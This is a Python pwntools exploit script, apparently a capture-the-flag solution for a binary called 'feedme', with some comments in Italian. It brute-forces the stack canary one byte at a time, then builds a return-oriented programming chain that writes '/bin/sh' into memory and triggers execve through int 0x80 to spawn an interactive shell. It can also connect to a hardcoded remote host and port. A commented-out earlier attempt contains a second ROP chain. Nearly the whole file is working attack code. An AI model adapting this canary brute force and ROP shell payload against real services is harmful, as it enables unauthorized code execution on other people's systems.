#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template feedme
from pwn import *
from struct import pack

# Set up pwntools for the correct architecture
exe = context.binary = ELF('feedme')
context.terminal = ['gnome-terminal', '-e']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("131.114.59.19", 8198, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
gef config context.nb_lines_stack 40
tbr *0x80490d7
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

feeding_size = 0x20 # Hex per 32 = offset 1 byte prima di canary
feed_str = "1" * feeding_size
canary_size_bytes = 4
canary_array = bytearray()

main_addr = 0x0804917a
printf_addr = 0x0806f34a
read_1_byte_addr = 0x08048e42 # Byte messo in AL
int80_addr = 0x08049761
pop_eax_ret_addr = 0x080bb496
push_eax_ret_addr = 0x080bb436
inc_eax_ret = 0x080497fe
dec_eax_ret = 0x080497a4
mov_ptr_eax_edx_ret_addr = 0x0807be31
xchg_eax_edx_ret_addr = 0x080ad71c
xchg_eax_ebx_cose_brutte_ret_addr = 0x080e3529 #xchg eax, ebx; or cl, byte ptr [esi]; adc al, 0x41; ret;
xchg_eax_ecx_cose_brutte_ret_addr = 0x080e631d #xchg eax, ecx; or cl, byte ptr [esi]; adc al, 0x41; ret; 
add_ecx_ebx_cose_brutte_ret_addr = 0x080dfefc #add ecx, ebx; add dword ptr [edx], ecx; ret;
mov_eax_ebx_pop_ebx_ret_addr = 0x0804fc12 #mov eax, ebx; pop ebx; ret;
pop_ebx_ret_addr = 0x080481c9
pop_edx_ret_addr = 0x0806f34a
mov_ecx_ffffffff_brutto_ret = 0x0805bc0c #mov ecx, 0xffffffff; cmovb eax, ecx; ret;
inc_ecx_ret = 0x080da88c


addr_len = 4
start_payload = 0x20

loop_counter = 0

io = start()

io.recvuntil("FEED ME!")

while(len(canary_array) != canary_size_bytes):
    
    feeding_size += 1

    for i in range(255):

        loop_counter += 1

        tmp_str = feed_str + chr(i)

        io.send(chr(feeding_size))
        io.send(tmp_str)

        res = io.recvuntil("FEED ME!")

        if(b"YUM" in res):
            canary_array.append(i)
            feed_str = tmp_str
            break

    canary_int = int.from_bytes(canary_array, "little")
    log.info("%x" % canary_int)

payload0 = dict()

#Nota: abbiamo ancora l'indirizzo del buffer del payload in EAX


p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # a36ade6af262a34e1b7c715f72d259556ab6837fcb5d189128409ab33047bf23
rebase_0 = lambda x : p(x + IMAGE_BASE_0)


payload0[start_payload] = canary_int
payload0[start_payload + 4*addr_len] = rebase_0(0x00073496) # 0x080bb496: pop eax; ret; 
payload0[start_payload + 5*addr_len] = '//bi'
payload0[start_payload + 6*addr_len] = rebase_0(0x0002734a) # 0x0806f34a: pop edx; ret; 
payload0[start_payload + 7*addr_len] = rebase_0(0x000a2060)
payload0[start_payload + 8*addr_len] = rebase_0(0x000527ed) # 0x0809a7ed: mov dword ptr [edx], eax; ret; 
payload0[start_payload + 9*addr_len] = rebase_0(0x00073496) # 0x080bb496: pop eax; ret; 
payload0[start_payload + 10*addr_len] = 'n/sh'
payload0[start_payload + 11*addr_len] = rebase_0(0x0002734a) # 0x0806f34a: pop edx; ret; 
payload0[start_payload + 12*addr_len] = rebase_0(0x000a2064)
payload0[start_payload + 13*addr_len] = rebase_0(0x000527ed) # 0x0809a7ed: mov dword ptr [edx], eax; ret; 
payload0[start_payload + 14*addr_len] = rebase_0(0x00073496) # 0x080bb496: pop eax; ret; 
payload0[start_payload + 15*addr_len] = p32(0x00000000)
payload0[start_payload + 16*addr_len] = rebase_0(0x0002734a) # 0x0806f34a: pop edx; ret; 
payload0[start_payload + 17*addr_len] = rebase_0(0x000a2068)
payload0[start_payload + 18*addr_len] = rebase_0(0x000527ed) # 0x0809a7ed: mov dword ptr [edx], eax; ret; 
payload0[start_payload + 19*addr_len] = rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
payload0[start_payload + 20*addr_len] = rebase_0(0x000a2060)
payload0[start_payload + 21*addr_len] = mov_ecx_ffffffff_brutto_ret
payload0[start_payload + 22*addr_len] = inc_ecx_ret
payload0[start_payload + 23*addr_len] = rebase_0(0x0002734a) # 0x0806f34a: pop edx; ret; 
payload0[start_payload + 24*addr_len] = rebase_0(0x000a2068)
payload0[start_payload + 25*addr_len] = rebase_0(0x00073496) # 0x080bb496: pop eax; ret; 
payload0[start_payload + 26*addr_len] = p32(0x0000000b)
payload0[start_payload + 27*addr_len] = rebase_0(0x00027a20) # 0x0806fa20: int 0x80; ret; 


'''
#Tentativo precedente
payload0[start_payload] = canary_int
payload0[start_payload + 4*addr_len] = pop_edx_ret_addr
payload0[start_payload + 5*addr_len] = bytes("/bin/sh\x00", "ascii")[0:4]
payload0[start_payload + 6*addr_len] = mov_ptr_eax_edx_ret_addr
payload0[start_payload + 7*addr_len] = inc_eax_ret 
payload0[start_payload + 8*addr_len] = inc_eax_ret 
payload0[start_payload + 9*addr_len] = inc_eax_ret 
payload0[start_payload + 10*addr_len] = inc_eax_ret 
payload0[start_payload + 11*addr_len] = pop_edx_ret_addr
payload0[start_payload + 12*addr_len] = bytes("/bin/sh\x00", "ascii")[4:8]
payload0[start_payload + 13*addr_len] = mov_ptr_eax_edx_ret_addr
payload0[start_payload + 14*addr_len] = dec_eax_ret
payload0[start_payload + 15*addr_len] = dec_eax_ret
payload0[start_payload + 16*addr_len] = dec_eax_ret
payload0[start_payload + 17*addr_len] = dec_eax_ret
payload0[start_payload + 18*addr_len] = xchg_eax_ebx_cose_brutte_ret_addr
payload0[start_payload + 19*addr_len] = pop_edx_ret_addr
payload0[start_payload + 20*addr_len] = p32(0)
payload0[start_payload + 21*addr_len] = pop_eax_ret_addr
payload0[start_payload + 22*addr_len] = p32(0xb)
payload0[start_payload + 23*addr_len] = int80_addr
'''

payload0 = fit(payload0)

log.info(len(payload0))

io.send(chr(len(payload0)))
io.send(payload0)

io.interactive()

